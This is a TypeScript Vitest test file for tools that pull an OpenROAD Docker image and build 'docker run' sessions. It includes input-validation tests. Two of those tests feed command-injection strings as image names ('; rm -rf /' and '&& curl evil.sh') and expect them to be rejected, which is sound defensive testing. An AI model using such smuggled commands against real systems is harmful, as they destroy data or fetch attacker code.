import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import type { Mock } from "vitest";
import { EventEmitter } from "node:events";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const spawnMock = vi.fn();
vi.mock("node:child_process", () => ({ spawn: (...args: unknown[]) => spawnMock(...args) }));

const { PullOrfsImageTool, CreateDockerOrfsSessionTool, DEFAULT_ORFS_IMAGE } = await import(
  "../../src/tools/docker_orfs.js"
);
import type { OpenROADManager } from "../../src/core/manager.js";
import { SessionState } from "../../src/core/models.js";
import type { InteractiveSessionInfo } from "../../src/core/models.js";

const NOW = "2024-01-01T00:00:00.000Z";

function makeSessionInfo(overrides: Partial<InteractiveSessionInfo> = {}): InteractiveSessionInfo {
  return {
    sessionId: "session-1",
    createdAt: NOW,
    isAlive: true,
    commandCount: 0,
    bufferSize: 0,
    uptimeSeconds: 0,
    state: SessionState.ACTIVE,
    error: null,
    ...overrides,
  };
}

interface MockManager extends Record<string, Mock> {
  createSession: Mock;
  getSessionInfo: Mock;
}

function makeMockManager(): MockManager {
  return {
    createSession: vi.fn().mockResolvedValue("session-1"),
    getSessionInfo: vi.fn().mockResolvedValue(makeSessionInfo()),
  };
}

class FakeChild extends EventEmitter {
  stdout = new EventEmitter();
  stderr = new EventEmitter();
  kill = vi.fn();
}

describe("PullOrfsImageTool", () => {
  let tool: InstanceType<typeof PullOrfsImageTool>;

  beforeEach(() => {
    spawnMock.mockReset();
    tool = new PullOrfsImageTool(makeMockManager() as unknown as OpenROADManager);
  });

  it("pulls the default image and reports success", async () => {
    const child = new FakeChild();
    spawnMock.mockReturnValue(child);

    const promise = tool.execute();
    queueMicrotask(() => {
      child.stdout.emit("data", Buffer.from("Pulling from openroad/orfs\n"));
      child.emit("close", 0);
    });

    const result = JSON.parse(await promise);
    expect(spawnMock).toHaveBeenCalledWith("docker", ["pull", DEFAULT_ORFS_IMAGE]);
    expect(result.image).toBe(DEFAULT_ORFS_IMAGE);
    expect(result.pulled).toBe(true);
    expect(result.error).toBeNull();
    expect(result.output).toContain("Pulling from openroad/orfs");
  });

  it("uses a custom image when given", async () => {
    const child = new FakeChild();
    spawnMock.mockReturnValue(child);

    const promise = tool.execute("openroad/orfs:custom-tag");
    queueMicrotask(() => child.emit("close", 0));

    const result = JSON.parse(await promise);
    expect(spawnMock).toHaveBeenCalledWith("docker", ["pull", "openroad/orfs:custom-tag"]);
    expect(result.image).toBe("openroad/orfs:custom-tag");
  });

  it("rejects an unsafe image reference without spawning", async () => {
    const result = JSON.parse(await tool.execute("openroad/orfs; rm -rf /"));
    expect(spawnMock).not.toHaveBeenCalled();
    expect(result.pulled).toBe(false);
    expect(result.error).toMatch(/Invalid image reference/);
  });

  it("reports a non-zero exit code", async () => {
    const child = new FakeChild();
    spawnMock.mockReturnValue(child);

    const promise = tool.execute();
    queueMicrotask(() => child.emit("close", 1));

    const result = JSON.parse(await promise);
    expect(result.pulled).toBe(false);
    expect(result.error).toMatch(/exited with code 1/);
  });

  it("reports a clear error when docker is not installed", async () => {
    const child = new FakeChild();
    spawnMock.mockReturnValue(child);

    const promise = tool.execute();
    queueMicrotask(() => {
      const err = new Error("spawn docker ENOENT") as NodeJS.ErrnoException;
      err.code = "ENOENT";
      child.emit("error", err);
    });

    const result = JSON.parse(await promise);
    expect(result.pulled).toBe(false);
    expect(result.error).toMatch(/Docker CLI not found/);
  });

  it("times out a hanging pull and kills the process", async () => {
    const child = new FakeChild();
    spawnMock.mockReturnValue(child);

    const result = JSON.parse(await tool.execute(undefined, 20));
    expect(child.kill).toHaveBeenCalledWith("SIGKILL");
    expect(result.pulled).toBe(false);
    expect(result.error).toMatch(/Timed out/);
  });
});

describe("CreateDockerOrfsSessionTool", () => {
  let mgr: MockManager;
  let tool: InstanceType<typeof CreateDockerOrfsSessionTool>;
  let flowDir: string;

  beforeEach(() => {
    mgr = makeMockManager();
    tool = new CreateDockerOrfsSessionTool(mgr as unknown as OpenROADManager);
    flowDir = fs.mkdtempSync(path.join(os.tmpdir(), "orfs-flow-"));
  });

  afterEach(() => {
    fs.rmSync(flowDir, { recursive: true, force: true });
  });

  it("builds the default docker run argv and creates a session", async () => {
    const raw = await tool.execute(undefined, undefined, flowDir);
    const result = JSON.parse(raw);

    expect(mgr.createSession).toHaveBeenCalledWith({
      command: [
        "docker",
        "run",
        "--rm",
        "-i",
        "-v",
        `${flowDir}:/OpenROAD-flow-scripts/flow`,
        "--network",
        "none",
        DEFAULT_ORFS_IMAGE,
        "openroad",
        "-no_init",
      ],
    });
    expect(result.session_id).toBe("session-1");
  });

  it("passes sessionId through when given", async () => {
    await tool.execute("my-session", undefined, flowDir);
    expect(mgr.createSession).toHaveBeenCalledWith(
      expect.objectContaining({ sessionId: "my-session" }),
    );
  });

  it("omits --network none when network is true", async () => {
    await tool.execute(undefined, undefined, flowDir, undefined, undefined, undefined, true);
    const call = mgr.createSession.mock.calls[0]![0] as { command: string[] };
    expect(call.command).not.toContain("--network");
  });

  it("appends -e flags for extra env vars", async () => {
    await tool.execute(undefined, undefined, flowDir, undefined, undefined, { FOO: "bar" });
    const call = mgr.createSession.mock.calls[0]![0] as { command: string[] };
    expect(call.command).toContain("-e");
    expect(call.command).toContain("FOO=bar");
  });

  it("uses a custom image and container command", async () => {
    await tool.execute(undefined, "openroad/orfs:custom", flowDir, "/flow", ["bash"]);
    const call = mgr.createSession.mock.calls[0]![0] as { command: string[] };
    expect(call.command).toContain(`${flowDir}:/flow`);
    expect(call.command).toContain("openroad/orfs:custom");
    expect(call.command.slice(-1)).toEqual(["bash"]);
  });

  it("rejects an unsafe image reference without creating a session", async () => {
    const result = JSON.parse(await tool.execute(undefined, "orfs && curl evil.sh", flowDir));
    expect(mgr.createSession).not.toHaveBeenCalled();
    expect(result.error).toMatch(/Invalid image reference/);
  });

  it("rejects a relative flow_dir", async () => {
    const result = JSON.parse(await tool.execute(undefined, undefined, "relative/path"));
    expect(mgr.createSession).not.toHaveBeenCalled();
    expect(result.error).toMatch(/must be an absolute path/);
  });

  it("rejects a flow_dir that does not exist", async () => {
    const missing = path.join(flowDir, "does-not-exist");
    const result = JSON.parse(await tool.execute(undefined, undefined, missing));
    expect(mgr.createSession).not.toHaveBeenCalled();
    expect(result.error).toMatch(/does not exist/);
  });

  it("rejects a flow_dir that is a file, not a directory", async () => {
    const filePath = path.join(flowDir, "not-a-dir");
    fs.writeFileSync(filePath, "x");
    const result = JSON.parse(await tool.execute(undefined, undefined, filePath));
    expect(mgr.createSession).not.toHaveBeenCalled();
    expect(result.error).toMatch(/is not a directory/);
  });

  it("rejects an invalid environment variable name", async () => {
    const result = JSON.parse(
      await tool.execute(undefined, undefined, flowDir, undefined, undefined, { "bad-key": "x" }),
    );
    expect(mgr.createSession).not.toHaveBeenCalled();
    expect(result.error).toMatch(/Invalid environment variable name/);
  });

  it("surfaces manager.createSession failures as a session error result", async () => {
    mgr.createSession.mockRejectedValue(new Error("boom"));
    const result = JSON.parse(await tool.execute(undefined, undefined, flowDir));
    expect(result.session_id).toBe("unknown");
    expect(result.error).toMatch(/boom/);
  });
});
